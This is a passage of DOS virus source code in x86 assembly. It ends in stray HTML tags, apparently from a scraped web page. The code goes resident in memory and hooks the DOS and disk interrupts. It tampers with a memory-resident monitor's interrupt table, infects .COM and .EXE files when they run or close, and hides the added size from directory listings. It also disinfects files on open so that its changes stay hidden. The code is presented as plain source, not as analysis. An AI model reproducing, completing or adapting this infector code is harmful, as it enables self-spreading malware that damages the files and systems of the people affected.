                int     13h
                cmp     bx,0abcdh                       ;is it?
                jne     install_virus                   ;jmp, if not & install
leave_mcb:      jmp     exit_mem                        ;yes, leave then

;--------- Going Resident ------

steal_some:     mov     al,byte ptr cs:[mcb][bp]        ;if tb is here, steal
                cmp     al,0ffh                         ;memory from it!
                je      leave_mcb                       ;error? exit then
                inc     byte ptr cs:[mcb][bp]           ;inc flag
                cmp     al,01                           ;
                ja      mcb3_1

install_virus:  mov     ah,52h                          ;get the list of lists
                int     21h                             ;use dos
                mov     ax,es:[bx-2]                    ;get first mcb chain

                mov     es,ax                           ;es=segment of 1st mcb
mcb1:           cmp     byte ptr es:[0000h],'Z'         ;is it the last mcb
                jne     mcb2                            ;jmp if not
                clc                                     ;yes last mcb, CLC
                jmp     short mcbx                      ;outta here

mcb2:           cmp     byte ptr es:[0000h],'M'         ;is it in the chain
                je      mcb3                            ;jmp if yes
                stc                                     ;error, set carry flag
                jmp     short mcbx                      ;outta here

mcb3:           cmp     byte ptr cs:[mcb][bp],0         ;is TB flag off?
                je      mcb3_1                          ;if yes, then jmp
                mov     dx,ds                           ;else cmp TB ds
                sub     dx,10h                          ;ds-10
                cmp     word ptr es:[0001h],dx          ;cmp to mcb owner.
                je      mcbx_1

mcb3_1:         mov     ax,es                           ;ax=es
                add     ax,word ptr es:[0003h]          ;ax=es + next mcb
                inc     ax                              ;get mcb
                mov     es,ax                           ;es=ax:next mcb chain
                jmp     short mcb1                      ;goto first step

mcbx:           jc      leave_mcb                       ;if error, exit
mcbx_1:         cmp     word ptr es:[0003],(virus_size/16) + 11h
                jb      steal_some
                mov     byte ptr es:[0000],'Z'          ;the last mcb chain!
                sub     word ptr es:[0003],(virus_size/16) + 11h
                add     ax,word ptr es:[0003h]          ;figure out segment
                inc     ax                              ;add 16 bytes
                mov     es,ax                           ;new segment in es
                mov     di,103h                         ;offset is 103h
                push    ds                              ;save TB ds location
                push    cs
                pop     ds                              ;virus cs=ds
                mov     si,offset init_virus            ;si=top of virus
                add     si,bp                           ;add delta
                mov     cx,virus_size                   ;move virus_size
                cld                                     ;clear direction flag
                repne   movsb                           ;do it Mr. Crunge

                mov     ds,cx                           ;ds=0000
hook_again:     cli                                     ;disable ints
                mov     word ptr ds:[0084h],offset int21_handler     ;hook int21
                mov     word ptr ds:[0086h],es
                mov     word ptr ds:[0070h],offset int1c_handler     ;hook int1c
                mov     word ptr ds:[0072h],es
                mov     word ptr ds:[004ch],offset int13_handler     ;hook int13
                mov     word ptr ds:[004eh],es
                sti                                     ;enable ints

                cmp     byte ptr cs:[tb_here][bp],00h   ;was TB found?
                je      go_on                           ;no, then jmp
                cmp     cl,01h                          ;is this the 2nd x here?
                je      go_on                           ;yes, then jmp
                mov     ds,word ptr cs:[tb_int2][bp]    ;get TB int segment
                inc     cl                              ;inc cl
                jmp     short hook_again                ;hook ints again

go_on:          pop     ds                              ;get TB code segment
                cmp     byte ptr cs:[tb_here][bp],01h   ;TB here?
                je      hook_tb_ints                    ;yes, then jmp
                jmp     exit_mem                        ;else exit
hook_tb_ints:   mov     si,word ptr cs:[tb_ints][bp]    ;get TB int offset
                mov     word ptr ds:[si+84h],offset int21_handler
                mov     word ptr ds:[si+86h],es
                mov     word ptr ds:[si+70h],offset int1c_handler
                mov     word ptr ds:[si+72h],es
                mov     word ptr ds:[si+4ch],offset int13_handler
                mov     word ptr ds:[si+4eh],es

exit_mem:       cmp     word ptr cs:[buffer][bp],5A4Dh  ;.exe file?
                je      exit_exe_file                   ;yupe exit exe file
                cmp     word ptr cs:[buffer][bp],4D5Ah  ;.exe file?
                je      exit_exe_file                   ;yupe exit exe file
                push    cs                              ;fix cs=ds for .com
                pop     ds
                mov     bx,offset buffer                ;get first 3 bytes
                add     bx,bp                           ;fix delta
                mov     ax,[bx]                         ;move first 2 bytes
                mov     word ptr ds:[100h],ax           ;put em in the beginning
                inc     bx                              ;inc pointer
                inc     bx
                mov     al,[bx]                         ;get last of 3rd byte
                mov     byte ptr ds:[102h],al           ;put that in place
                pop     ds
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     word ptr cs:[ax_reg][bp]        ;save ax else where
                mov     ax,100h
                push    ax                              ;fake a CALL & RETN
                mov     ax,word ptr cs:[ax_reg][bp]     ;put ax as normal
                retn                                    ;link to 100h

exit_exe_file:  mov     dx,ds                           ;get psp=ds seg
                add     dx,10h                          ;add 16bytes to seg
                pop     ds
                pop     si
                pop     word ptr cs:[ax_reg][bp]
                pop     cx
                pop     bx
                pop     ax
                add     word ptr cs:[buffer+22][bp],dx  ;fix segments
                add     dx,word ptr cs:[buffer+14][bp]
                cli
                mov     ss,dx                           ;restore ss
                mov     sp,word ptr cs:[buffer+16][bp]  ;and sp
                sti
                mov     dx,word ptr cs:[ax_reg][bp]
                jmp     dword ptr cs:[buffer+20][bp]    ;jmp to entry pt.

mcb             db      0
ax_reg          dd      0
int13           dd      0
int1c           dd      0
int21           dd      0
tb_ints         dd      0
tb_here         db      0
tb_int2         dd      0

;===============================================================================
;                       Int 13h Handler
;===============================================================================
int13_handler:
                cmp     ax,0abcdh                       ;virus test
                je      int13_test                      ;yupe

int13call:      jmp     dword ptr cs:[int13]            ;original int13

int13_test:     mov     bx,ax                           ;fix
                iret
;===============================================================================
;                       Int 1Ch Handler
;===============================================================================
int1c_handler:
                iret
;-------------------------------------------------------------------------------
;                       FCB Dir Stealth Routine (File Find)
;-------------------------------------------------------------------------------
fcb_dir:        call    calldos21                       ;get the fcb block
                test    al,al                           ;test for error
                jnz     fcb_out                         ;jmp if error
                push    ax                              ;save registers
                push    bx
                push    cx
                push    es
                mov     ah,51h                          ;get current psp
                call    calldos21                       ;call int21

                mov     es,bx                           ;es=segment of psp
                cmp     bx,es:[16h]                     ;psp of command.com?
                jnz     fcb_out1                        ;no, then jmp
                mov     bx,dx                           ;ds:bx=fcb
                mov     al,[bx]                         ;1st byte of fcb
                push    ax                              ;save it
                mov     ah,2fh                          ;get dta
                call    calldos21                       ;es:bx <- dta

                pop     ax                              ;get first byte
                inc     al                              ;al=ffh therefor al=ZR
                jnz     fcb_old                         ;if != ZR jmp
                add     bx,7h                           ;extended fcb here, +7
fcb_old:        mov     ax,es:[bx+17h]                  ;get file time stamp
                mov     cx,es:[bx+19h]                  ;get file date stamp
                and     ax,1fh                          ;unmask seconds field
                and     cx,1fh                          ;unmask day of month
                xor     ax,cx                           ;are they equal?
                jnz     fcb_out1                        ;nope, exit then
                sub     word ptr es:[bx+1dh],virus_size ;sub away virus_size
                sbb     word ptr es:[bx+1fh],0          ;sub with carry flag

fcb_out1:       pop     es                              ;restore registers
                pop     cx
                pop     bx
                pop     ax
fcb_out:        iret                                    ;return control
;-------------------------------------------------------------------------------
;                       ASCIIZ Dir Stealth Routine (File Find)
;-------------------------------------------------------------------------------
dta_dir:        call    calldos21                       ;get results to dta
                jb      dta_out                         ;if error, split
                push    ax                              ;save register
                push    bx
                push    cx
                push    es
                mov     ah,2fh                          ;get current dta
                call    calldos21                       ;es:bx <- dta

                mov     ax,es:[bx+16h]                  ;get file time stamp
                mov     cx,es:[bx+18h]                  ;get file date stamp
                and     ax,1fh                          ;unmask seconds field
                and     cx,1fh                          ;unmask day of month
                xor     ax,cx                           ;are they equal
                jnz     dta_out1                        ;nope, exit then
                sub     word ptr es:[bx+1ah],virus_size ;sub away virus_size
                sbb     word ptr es:[bx+1ch],0          ;sub with carry flag

dta_out1:       pop     es                              ;restore registers
                pop     cx
                pop     bx
                pop     ax
dta_out:        retf    0002h                           ;pop 2 words of stack
;===============================================================================
;                       Int 21h Handler
;===============================================================================
int21_handler:
;                cmp     ah,11h                          ;FCB find first match
;                je      old_dir
;                cmp     ah,12h                          ;FCB find next match
;                je      old_dir
                cmp     ah,4eh                          ;Find first match
                je      new_dir
                cmp     ah,4fh                          ;Find next match
                je      new_dir
                cmp     ah,3dh                          ;Opening a file
                je      file_open
                cmp     ah,6ch                          ;Ext_opening a file
                je      file_ext_open
                cmp     ah,3eh                          ;closing a file
                je      file_close
                cmp     ah,4bh                          ;Execution of a file
                je      file_execute

int21call:      jmp     dword ptr cs:[int21]            ;original int21

old_dir:        jmp     fcb_dir                         ;fcb file find

new_dir:        jmp     dta_dir                         ;new asciiz file find

file_open:      jmp     open_file                       ;disinfect opening file

file_ext_open:  jmp     open_ext_file                   ;disinfect opening file

file_close:     jmp     close_file                      ;infect closing file

file_execute:   call    check_extension                 ;check for ok ext
                cmp     byte ptr cs:[com_ext],1         ;is it a com?
                je      exec_disinfect                  ;yupe disinfect it
                cmp     byte ptr cs:[exe_ext],1         ;is it a exe?
                je      exec_disinfect                  ;yupe disinfect it
                jmp     SHORT int21call

exec_disinfect: call    exec_disinfect1                 ;Disinfect file

                mov     word ptr cs:[ax_reg],dx
                pushf                                   ;fake an int
                call    dword ptr cs:[int21]            ;call dos
                xchg    word ptr cs:[ax_reg],dx         ;restore dx

                mov     byte ptr cs:[close],0           ;reset flag..
                push    ax                              ;store 'em
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    es
                push    ds
closing_infect: mov     ax,3524h                        ;get error handler
                call    calldos21                       ;call dos

                push    es                              ;save es:bx= int_24
                push    bx                              ;error handler
                push    ds                              ;ds:dx= asciiz string
                push    dx
                push    cs                              ;cs=ds
                pop     ds
                mov     dx,offset int21_handler         ;hook error handler
                mov     ax,2524h                        ;with our int24h
                call    calldos21
                pop     dx                              ;restore ds:dx asciiz
                pop     ds                              ;string

                cmp     byte ptr cs:[close],0           ;Are we closing file?
                je      exec_get_att                    ;nope, then jmp
                mov     ax,word ptr cs:[handle]         ;yupe, ax=file handle
                jmp     exec_open_ok                    ;jmp so you don't open
                                                        ;the file twice...
exec_get_att:   mov     ax,4300h                        ;get file attribs
                call    calldos21                       ;call dos
                jnc     exec_attrib                     ;no, error jmp
                jmp     exec_exit2                      ;ERROR - split

exec_attrib:    mov     byte ptr cs:[attrib],cl
                test    cl,1                            ;check bit 0 (read_only)
                jz      exec_attrib_ok                  ;if bit0=0 jmp
                dec     cx                              ;else turn of bit_0
                mov     ax,4301h                        ;write new attribs
                call    calldos21                       ;call dos

exec_attrib_ok: mov     ax,3d02h                        ;open file for r/w
                call    calldos21                       ;call dos
                jnc     exec_open_ok                    ;ok, no error jmp
                jmp     exec_exit2                      ;ERROR - split

exec_open_ok:   xchg    bx,ax                           ;bx=file handler
                push    cs                              ;cs=ds
                pop     ds
                mov     ax,5700h                        ;get file time/date
                call    calldos21                       ;call dos

                mov     word ptr cs:[old_time],cx       ;save file time
                mov     word ptr cs:[org_time],cx
                mov     word ptr cs:[old_date],dx       ;save file date
                and     cx,1fh                          ;unmask second field
                and     dx,1fh                          ;unmask date field
                xor     cx,dx                           ;are they equal?
                jnz     exec_time_ok                    ;nope, file not infected
                jmp     exec_exit3                      ;FILE INFECTED

exec_time_ok:   and     word ptr cs:[old_time],0ffe0h   ;reset second bits
                or      word ptr cs:[old_time],dx       ;seconds=day of month

                mov     ax,4200h                        ;reset ptr to beginning
                xor     cx,cx                           ;(as opened files may
                xor     dx,dx                           ; have ptr anywhere,
                call    calldos21                       ; so be smart!)

                mov     word ptr cs:[marker],0DBDBh     ;File Infection marker
                mov     dx,offset ds:[buffer]           ;ds:dx buffer
                mov     cx,18h                          ;read 18h bytes
                mov     ah,3fh                          ;read from handle
                call    calldos21                       ;call dos

                jc      exec_exit1                      ;error? if yes jmp
                sub     cx,ax                           ;did we read 18h bytes?
                jnz     exec_exit1                      ;if no exit
                mov     dx,cx                           ;cx=0 dx=0
                mov     ax,4202h                        ;jmp to EOF
                call    calldos21                       ;call dos

                jc      exec_exit1                      ;error? exit if so.
                mov     word ptr cs:[filesize+2],ax     ;save lower 16bit fileSz
                mov     word ptr cs:[filesize],dx       ;save upper 16bit fileSz
                call    chkbuf                          ;check if .exe
                jz      exec_cool                       ;jmp if .exe file
                cmp     ax,0FFF0h - virus_size          ;64k-256-virus < 64k?
                jb      exec_cool                       ;if less jmp!

exec_exit1:     jmp     exec_exit3                      ;exit!

;_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-
;                       Mutate and infect
;-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_

exec_cool:      mov     dx,offset init_virus            ;ds:dx=virus beginning
                mov     cx,virus_size                   ;cx=virus size
                mov     ah,40h                          ;write to handle
                call    calldos21                       ;call dos

                jc      exec_exit1                      ;error? if yes exit
                sub     cx,ax                           ;cx=ax bytes?
                jnz     exec_exit1                      ;not equal exit
                mov     dx,cx                           ;cx=0 dx=0
                mov     ax,4200h                        ;jmp to top of file
                call    calldos21                       ;call dos

                jc      exec_exit1                      ;error, then exit
                mov     ax,word ptr cs:[filesize+2]     ;ax=lower 16bit fileSize
                call    chkbuf                          ;check if .exe
                jnz     exec_com_file                   ;if !=.exe jmp
                mov     dx,word ptr cs:[filesize]       ;get upper 16bit

                mov     cx,4                            ;cx=0004
                mov     si,word ptr cs:[buffer+8]       ;get exe header size
                shl     si,cl                           ;mul by 16
                sub     ax,si                           ;exe_header - filesize
                sbb     dx,0h                           ;sub with carry

                mov     cx,10h                          ;cx=0010
                div     cx                              ;ax=length in para
                                                        ;dx=remaider
                mov     word ptr cs:[buffer+20],dx      ;New IP offset address
                mov     word ptr cs:[buffer+22],ax      ;New CS (In paragraphs)
                add     dx,virus_size+100h              ;Dx=virus_size+256

                mov     word ptr cs:[buffer+16],dx      ;New SP entry
                mov     word ptr cs:[buffer+14],ax      ;New SS (in para)
                add     word ptr cs:[buffer+10],(virus_size)/16+1   ;min para
                mov     ax,word ptr cs:[buffer+10]      ;ax=min para needed
                cmp     ax,word ptr cs:[buffer+12]      ;cmp with max para
                jb      exec_size_ok                    ;jmp if ok!
                mov     word ptr cs:[buffer+12],ax      ;nop, enter new max

exec_size_ok:   mov     ax,word ptr cs:[buffer+2]       ;ax=file size
                add     ax,virus_size                   ;add virus to it
                push    ax                              ;push it
                and     ah,1                            ;
                mov     word ptr cs:[buffer+2],ax       ;restore new value
                pop     ax                              ;pop ax
                mov     cl,9                            ;
                shr     ax,cl                           ;
                add     word ptr cs:[buffer+4],ax       ;enter fileSz + header
                mov     dx,offset buffer                ;ds:dx=new exe header
                mov     cx,18h                          ;cx=18h bytes to write
                jmp     SHORT exec_write_it             ;jmp...

exec_com_file:  sub     ax,3                            ;sub 3 for jmp address
                mov     word ptr cs:[buffer+1],ax       ;store new jmp value
                mov     byte ptr cs:[buffer],0E9h       ;E9h=JMP
                mov     dx,offset buffer                ;ds:dx=buffer
                mov     cx,3                            ;cx=3 bytes

exec_write_it:  mov     ah,40h                          ;write to file handle
                call    calldos21                       ;call dos

                mov     dx,word ptr cs:[old_date]       ;restore old date
                mov     cx,word ptr cs:[old_time]       ;restore old time
                mov     ax,5701h                        ;write back to file
                call    calldos21                       ;call dos

exec_exit3:     mov     ah,3eh                          ;close file
                call    calldos21                       ;call dos

exec_exit2:     pop     dx                              ;restore es:bx (the
                pop     ds                              ;original int_24)
                mov     ax,2524h                        ;put back to place
                call    calldos21                       ;call dos

                pop     ds
                pop     es
                pop     di                              ;pop registers
                pop     si
                pop     dx
                xor     cx,cx
                mov     cl,byte ptr cs:[attrib]         ;get old file attrib
                mov     ax,4301h                        ;put them back
                call    calldos21                       ;call dos
                pop     cx
                pop     bx
                pop     ax

                cmp     byte ptr cs:[close],0           ;get called by exec?
                je      exec_good_bye                   ;yep, then jmp
                iret                                    ;else exit now.

exec_good_bye:  mov     dx,word ptr cs:[ax_reg]         ;restore dx
                iret                                    ;iret
;-------------------------------------------------------------------------------
;                       Close File Int21h/ah=3Eh
;-------------------------------------------------------------------------------
close_file:     cmp     bx,4h                           ;file handler > 4?
                ja      close_cont                      ;jmp if above
                jmp     int21call                       ;else exit

close_cont:     push    ax                              ;save 'em
                push    bx
                push    cx
                push    dx
                push    si
                push    di
                push    es
                push    ds

                push    bx                              ;save file handler
                mov     ax,1220h                        ;get job file table!
                int     2fh                             ;call multiplex
                                                        ;es:di=JFT for handler
                mov     ax,1216h                        ;get system file table
                mov     bl,es:[di]                      ;bl=SFT entry
                int     2fh                             ;call multiplex
                pop     bx                              ;save file handler

                add     di,0011h
                mov     byte ptr es:[di-0fh],02h        ;set to read/write

                add     di,0017h
                cmp     word ptr es:[di],'OC'           ;check for .COM file
                jne     closing_next_try                ;no try next ext
                cmp     byte ptr es:[di+2h],'M'         ;check last letter
                je      closing_cunt3                   ;no, file no good, exit

closing_exit:   jmp     closing_nogood                  ;exit

closing_next_try:
                cmp     word ptr es:[di],'XE'           ;check for .EXE file
                jne     closing_exit                    ;no, exit
                cmp     byte ptr es:[di+2h],'E'         ;check last letter
                jne     closing_exit                    ;no, exit

closing_cunt3:  mov     byte ptr cs:[close],1           ;set closing flag
                mov     word ptr cs:[handle],bx         ;save handler
                jmp     closing_infect                  ;infect file!

closing_nogood: pop     ds                              ;restore 'em
                pop     es
                pop     di
                pop     si
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                jmp     int21call                       ;good bye, baby...
;-------------------------------------------------------------------------------
;               Execute Disinfecting routine
;-------------------------------------------------------------------------------
exec_disinfect1         PROC
                push    ax                              ;save registers
                push    bx
                push    cx
                push    dx
                push    ds

                mov     ax,4300h                        ;get file attribs
                call    calldos21                       ;call dos

                test    cl,1h                           ;is Read-only flag?
                jz      okay_dis                        ;no, jmp attribs ok
                dec     cx                              ;turn off bit 0
                mov     ax,4301h                        ;write new attribs
                call    calldos21                       ;call dos
                jnc     okay_dis                        ;No error? then jmp
                jmp     end_dis                         ;error? exit!

okay_dis:       mov     ax,3d02h                        ;open file for r/w
                call    calldos21                       ;call dos
                jnc     dis_fileopen                    ;No error? then jmp
                jmp     end_dis                         ;Error? exit!

dis_fileopen:   xchg    bx,ax                           ;bx=file handle
                mov     ax,5700h                        ;get file time/date
                call    calldos21                       ;call dos

                mov     word ptr cs:[old_time],cx       ;save file time
                mov     word ptr cs:[old_date],dx       ;save file date
                and     cx,1fh                          ;unmask second field
                and     dx,1fh                          ;unmask date field
                xor     cx,dx                           ;are they equal?
                jnz     half_way                        ;nope, file not infected

                mov     ax,4202h                        ;jmp to EOF
                xor     cx,cx                           ;cx=0
                xor     dx,dx                           ;dx=0
                call    calldos21                       ;call dos

                push    cs                              ;cs=ds
                pop     ds                              ;
                mov     cx,dx                           ;dx:ax=file size
                mov     dx,ax                           ;save to cx:dx
                push    cx                              ;save upper fileSz
                push    dx                              ;save lower fileSz

                sub     dx,1Ch                          ;filesize-1C=origin byte
                sbb     cx,0                            ;sub with carry
                mov     ax,4200h                        ;position ptr
                call    calldos21                       ;call dos

                mov     ah,3fh                          ;open file
                mov     cx,1Ch                          ;read last 1Ch bytes
                mov     dx,offset org_time              ;put in ds:dx
                call    calldos21                       ;call dos
                call    chkbuf                          ;Did it work?
                je      half                            ;Yes,Jmp
                cmp     word ptr ds:[marker],0DBDBh     ;File REALLY Infected?
                je      half                            ;Yes, then jmp

                pop     dx
                pop     cx
half_way:       jmp     end_dis1                        ;exit, error!

half:           xor     cx,cx                           ;cx=0
                xor     dx,dx                           ;dx=0
                mov     ax,4200h                        ;pointer to top of file
                call    calldos21                       ;call dos

                mov     ah,40h                          ;write function
                mov     dx,offset buffer                ;ds:dx=buffer
                mov     cx,18h                          ;cx=18h bytes to write
                call    chkbuf                          ;check if .exe?
                jz      SHORT dis_exe_jmp               ;yupe, jmp
                mov     cx,3h                           ;else write 3 bytes
dis_exe_jmp:    call    calldos21                       ;call dos

                pop     dx                              ;pop original fileSz
                pop     cx

                sub     dx,virus_size                   ;Sub with virus_size
                sbb     cx,0                            ;sub with carry
                mov     ax,4200h                        ;ptr top of virus
                call    calldos21                       ;call dos

                mov     ah,40h                          ;write function
                xor     cx,cx                           ;write 0 bytes
                call    calldos21                       ;call dos! (new EOF)

                mov     cx,word ptr ds:[org_time]       ;get original time
                mov     dx,word ptr ds:[old_date]       ;get original date
                mov     ax,5701h                        ;put back to file
                call    calldos21                       ;call dos

end_dis1:       mov     ah,3eh                          ;close file handle
                call    calldos21                       ;call dos

end_dis:        pop     ds                              ;restore values
                pop     dx
                pop     cx
                pop     bx
                pop     ax
                ret
exec_disinfect1         ENDP
;-------------------------------------------------------------------------------
;                       Open File by DOS Int21h/ah=6ch
;-------------------------------------------------------------------------------
open_ext_file:  push    dx                              ;save DX
                mov     dx,si                           ;asciiz=DS:DX now
                jmp     open_ext                        ;jmp
;-------------------------------------------------------------------------------
;                       Open File by DOS Int21h/ah=3Dh
;-------------------------------------------------------------------------------
open_file:      push    dx                              ;save dx (asciiz)
open_ext:       call    check_extension                 ;check extension
                cmp     byte ptr cs:[com_ext],1         ;is it a .com?
                je      open_ok_ext                     ;yep, then jmp
                cmp     byte ptr cs:[exe_ext],1         ;is it a .exe?
                je      open_ok_ext                     ;yep, them jmp
                jmp     open_exit                       ;ext no good, exit!

open_ok_ext:    call    exec_disinfect1                 ;disinfect file!
open_exit:      pop     dx                              ;restore dx
                jmp     int21call                       ;exit to dos...
;-------------------------------------------------------------------------------
;                       Checks Buffer (EXE) Header
;-------------------------------------------------------------------------------
chkbuf                  PROC
                push    si                              ;save register
                mov     si,word ptr cs:[buffer]         ;get first word
                cmp     si,5A4Dh                        ;si=ZM?
                je      chkbuf_ok                       ;if yes exit
                cmp     si,4D5Ah                        ;si=MZ?
chkbuf_ok:      pop     si                              ;pop register
                ret
chkbuf                  ENDP
;-------------------------------------------------------------------------------
;                       Check file Extension
;-------------------------------------------------------------------------------
check_extension         PROC
                pushf                                   ;save flags
                push    cx                              ;save cx,si
                push    si
                mov     si,dx                           ;ds:[si]=asciiz
                mov     cx,128                          ;scan 128 bytes max
                mov     byte ptr cs:[com_ext],0         ;reset .com flag
                mov     byte ptr cs:[exe_ext],0         ;reset .exe flag

check_ext:      cmp     byte ptr ds:[si],2Eh            ;scan for "."
                je      check_ext1                      ;jmp if found
                inc     si                              ;else inc and loop
                loop    check_ext                       ;loop me

check_ext1:     inc     si                              ;inc asciiz ptr
                cmp     word ptr ds:[si],'OC'           ;is it .COM
                jne     check_ext2                      ;       ~~
                cmp     byte ptr ds:[si+2],'M'          ;is it .COM
                je      com_file_ext                    ;         ~

check_ext2:     cmp     word ptr ds:[si],'oc'           ;is it .com
                jne     check_ext3                      ;       ~~
                cmp     byte ptr ds:[si+2],'m'          ;is it .com
                je      com_file_ext                    ;         ~

check_ext3:     cmp     word ptr ds:[si],'XE'           ;is it .EXE
                jne     check_ext4                      ;       ~~
                cmp     byte ptr ds:[si+2],'E'          ;is it .EXE
                je      exe_file_ext                    ;         ~

check_ext4:     cmp     word ptr ds:[si],'xe'           ;is it .exe
                jne     check_ext_exit                  ;       ~~
                cmp     byte ptr ds:[si+2],'e'          ;is it .exe
                je      exe_file_ext                    ;         ~
                jmp     check_ext_exit                  ;neither exit

com_file_ext:   mov     byte ptr cs:[com_ext],1         ;found .com file
                jmp     SHORT check_ext_exit            ;jmp short
exe_file_ext:   mov     byte ptr cs:[exe_ext],1         ;found .exe file

check_ext_exit: pop     si                              ;restore
                pop     cx
                popf                                    ;save flags
                ret

com_ext         db      0                               ;flag on=.com file
exe_ext         db      0                               ;flag on=.exe file
check_extension         ENDP
;-------------------------------------------------------------------------------
;                       Original Int21h
;-------------------------------------------------------------------------------
calldos21               PROC
                pushf                                   ;fake int call
                call    dword ptr cs:[int21]            ;call original int_21
                ret
calldos21               ENDP
;===============================================================================
;                       Int 24h Handler
;===============================================================================
int24_handler:
                mov     al,3                            ;don't report error...
                iret                                    ;later dude...
;-------------------------------------------------------------------------------
;              FLAGS - FLAGS - FLAGS - FLAGS - FLAGS

close           db      0                       ;closing file

;-------------------------------------------------------------------------------
;             END - END - END - END - END - END - END

rand_val        dw      0
flags           dw      0                       ;Flags are saved here
attrib          db      0                       ;file's attrib
filesize        dd      0                       ;filesize
handle          dw      0                       ;file handler
old_date        dw      0                       ;file date
old_time        dw      0                       ;file time
;-------------------------------------------------------------------------------
org_time        dw      0                       ;original file time

;-------------------------------------------------------------------------------
buffer          db      0CDh,020h       ; 0 (0)  EXE file signature
                db      090h,090h       ; 2 (2)  Length of file
                db      090h,090h       ; 4 (4)  Size of file + header (512k)
                db      090h,090h       ; 6 (6)  # of relocation items
                db      090h,090h       ; 8 (8)  Size of header (16byte para)
                db      090h,090h       ; A (10) Min para needed (16byte)
                db      090h,090h       ; C (12) Max para needed (16byte)
                db      090h,090h       ; E (14) SS reg from start in para.
                db      090h,090h       ; 10(16) SP reg at entry
                db      090h,090h       ; 12(18) checksum
                db      090h,090h       ; 14(20) IP reg at entry
                db      090h,090h       ; 16(22) CS reg from start in para.
Marker          db      0DBh,0DBh       ; Marks THIS File as INFECTED!
last:
seg_a           ends
                end     start

</textarea></td></tr></table></body></html>
